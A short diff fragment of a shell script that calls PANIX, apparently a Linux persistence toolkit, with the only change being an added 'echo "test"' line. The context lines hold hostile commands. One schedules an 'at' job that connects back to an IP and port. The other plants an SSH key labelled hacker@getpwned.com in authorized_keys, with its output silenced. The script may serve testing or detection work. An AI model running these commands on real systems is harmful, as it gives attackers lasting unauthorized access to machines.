@@ -26,3 +26,4 @@ bash ./panix.sh -q --at --default --ip 192.168.34.3 --port 4446 --time "now + 24
  
 # authorized_keys persistence
 bash ./panix.sh -q --authorized-keys --default --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDubTGnY3TWk4ycUJg9E+VpkjCp1hcim4XdVioWtTUOf hacker@getpwned.com" >/dev/null
+echo "test"
